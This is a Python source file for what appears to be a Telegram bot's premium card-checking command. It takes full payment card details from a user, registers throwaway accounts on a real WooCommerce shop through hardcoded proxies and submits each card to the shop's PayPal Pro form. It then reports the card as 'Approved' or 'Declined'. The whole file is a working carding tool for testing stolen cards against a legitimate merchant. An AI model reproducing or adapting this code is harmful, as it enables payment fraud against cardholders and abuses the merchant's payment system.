import requests as r
import string, random, re
from src.assets.functions import antispam
from src.assets.Db import Database
from pyrogram.types import Message
from pyrogram import Client, filters, enums
from pyrogram.enums import ParseMode

session = r.Session()
API = "https://www.myliporidex.com/my-account/add-payment-method/"


proxy = {
    'http': 'http://38.154.227.167:5868',
    'http': 'http://185.199.229.156:7492'
}


@Client.on_message(filters.command(["jeico", "jk"], ["/", ",", ".", ";"]))
async def jaico(client: Client, m: Message):
    card = m.text.split(" ", 1)[1] if not m.reply_to_message else m.reply_to_message.text
    user_id = m.from_user.id
    with Database() as db:
        if not db.IsPremium(user_id):
            return await m.reply("<b>You are not premium</b>", quote=True)
        user_info = db.GetInfoUser(m.from_user.id)
    if not card:
        return await m.reply("You need to provide a card to verify", quote=True)
    antispam_result = antispam(user_id, user_info["ANTISPAM"])
    if antispam_result != False:
        return await m.reply(
            f"Please wait <code>{antispam_result}'s</code>", quote=True
        )
    await client.send_chat_action(m.chat.id, action=enums.ChatAction.TYPING)
    msg = await m.reply("checking...", quote=True)
    cc_check = await getLive(card, msg)    
    
def getIndex(response):
    with open("index.html", "w", encoding="utf-8") as f:
        f.write(response.text)
        
def getStr(text:str, a:str, b:str) -> str:
    return text.split(a)[1].split(b)[0]

def email_generator():
    dominio = ['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com', 'example.com']
    longitud = random.randint(8, 12)  # Longitud aleatoria del nombre de usuario
    usuario = ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(longitud))
    correo = usuario + '@' + random.choice(dominio)
    return correo

async def getLive(card, msg):
    card = card.replace(":", "|").replace("/", "|").replace(" ", "|")
    card_details = card.split("|")
    card = card_details[0]
    month = card_details[1]
    year = card_details[2]
    cvv = card_details[3]


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[ First Requests: get initial page, sfs cookie and nonce ]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

    headers = {
        'authority': 'www.myliporidex.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en,es;q=0.9',
        'cache-control': 'max-age=0',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
    }

    response = session.get('https://www.myliporidex.com/my-account/payment-methods/', headers=headers, proxies=proxy)
    sfs_cookie = response.cookies['_sfs_id']
    woocommerce_register_nonce = getStr(response.text, '"woocommerce-register-nonce" value="', '" /><input')
    
    await msg.edit_text("1", parse_mode=ParseMode.MARKDOWN)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[ Second Request: Register / Sign up and get Set-Cookie ]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

    cookies = {
        '_sfs_id': sfs_cookie
    }

    headers = {
        'authority': 'www.myliporidex.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en,es;q=0.9',
        'cache-control': 'max-age=0',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://www.myliporidex.com',
        'referer': 'https://www.myliporidex.com/my-account/payment-methods/',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
    }

    data = {
        'email': email_generator(),
        'woocommerce-register-nonce': woocommerce_register_nonce,
        '_wp_http_referer': '/my-account/payment-methods/',
        'register': 'Register',
    }

    response = session.post('https://www.myliporidex.com/my-account/payment-methods/', cookies=cookies, headers=headers, data=data, proxies=proxy)
    wfwaf_authcookie = response.headers['Set-Cookie'].split(";")[0]
    
    await msg.edit_text("2", parse_mode=ParseMode.MARKDOWN)



# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[ Second Request: Register / Sign up and get Set-Cookie ]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

    cookies = {
        wfwaf_authcookie.split("=")[0]: wfwaf_authcookie.split("=")[1],
        '_sfs_id': sfs_cookie,
    }

    headers = {
        'authority': 'www.myliporidex.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en,es;q=0.9',
        'referer': 'https://www.myliporidex.com/my-account/payment-methods/',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
    }

    response = session.get('https://www.myliporidex.com/my-account/add-payment-method/', cookies=cookies, headers=headers, proxies=proxy)
    woocommerce_add_payment_method_nonce =getStr(response.text, '<input type="hidden" id="woocommerce-add-payment-method-nonce" name="woocommerce-add-payment-method-nonce" value="', '"/>')[0:10]
    
    await msg.edit_text("3", parse_mode=ParseMode.MARKDOWN)


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[ Second Request: Register / Sign up and get Set-Cookie ]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

    cookies = {
        wfwaf_authcookie.split("=")[0]: wfwaf_authcookie.split("=")[1],
        '_sfs_id': sfs_cookie,
    }

    headers = {
        'authority': 'www.myliporidex.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en,es;q=0.9',
        'cache-control': 'max-age=0',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://www.myliporidex.com',
        'referer': 'https://www.myliporidex.com/my-account/add-payment-method/',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
    }

    data = {
        'payment_method': 'paypal_pro',
        'paypal_pro-card-number': card,
        'paypal_pro_card_expiration_month': month,
        'paypal_pro_card_expiration_year': year,
        'paypal_pro-card-cvc': cvv,
        'woocommerce-add-payment-method-nonce': woocommerce_add_payment_method_nonce,
        '_wp_http_referer': '/my-account/add-payment-method/',
        'woocommerce_add_payment_method': '1',
    }

    response = session.post('https://www.myliporidex.com/my-account/add-payment-method/', cookies=cookies, headers=headers, data=data, proxies=proxy)
    conver_proxy = re.sub(r'[^a-zA-Z0-9\s.:]+', '', str(proxy)).split(":")[2]
    hide_ip = conver_proxy.split('.')
    hide_ip[-3:] = ['x'] * 3
    show_ip= '.'.join(hide_ip)
    
    if 'class="button delete">Delete</a>&nbsp;' in response.text:
        mssg = f"""<b>Card Approved</b> ✅
━━━━━━━━━━━
┌ <b>Card:</b> <code>{card}:{month}:{year}:{cvv}</code>
├ <b>Gateway: Payflow + Woo</b>
└ <b>Proxy:</b> {show_ip}"""
        await msg.edit_text(mssg, parse_mode=ParseMode.HTML)
        
    elif "15004 - This transaction cannot be processed. Please enter a valid Credit Card Verification Number." in getStr(response.text, """<div class="woocommerce-MyAccount-content">
	<div class="woocommerce-notices-wrapper"><ul class="woocommerce-error" role="alert">
			<li>""", """</li>
	</ul>
</div>""").strip():
        response_code = getStr(response.text, """<div class="woocommerce-MyAccount-content">
	<div class="woocommerce-notices-wrapper"><ul class="woocommerce-error" role="alert">
			<li>""", """</li>
	</ul>
</div>""").strip()
        mssg = f"""<b>Card Approved</b> ✅ -» <b>ccn</b>
━━━━━━━━━━━
┌ <b>Card:</b> <code>{card}:{month}:{year}:{cvv}</code>
├ <b>Response:</b> {response_code}
├ <b>Gateway: Payflow + Woo</b>
└ <b>Proxy:</b> {show_ip}"""
        await msg.edit_text(mssg, parse_mode=ParseMode.HTML)

    else:
        response_code = getStr(response.text, """<div class="woocommerce-MyAccount-content">
	<div class="woocommerce-notices-wrapper"><ul class="woocommerce-error" role="alert">
			<li>""", """</li>
	</ul>
</div>""").strip()
        mssg = f"""<b>Card Declined</b> ❌
━━━━━━━━━━━
┌ <b>card:</b> <code>{card}:{month}:{year}:{cvv}</code>
├ <b>Response:</b> {response_code}
├ <b>Gateway: Payflow + Woo</b>
└<b>Proxy:</b> {show_ip}"""
        await msg.edit_text(mssg, parse_mode=ParseMode.HTML)
        
    session.cookies.clear()
        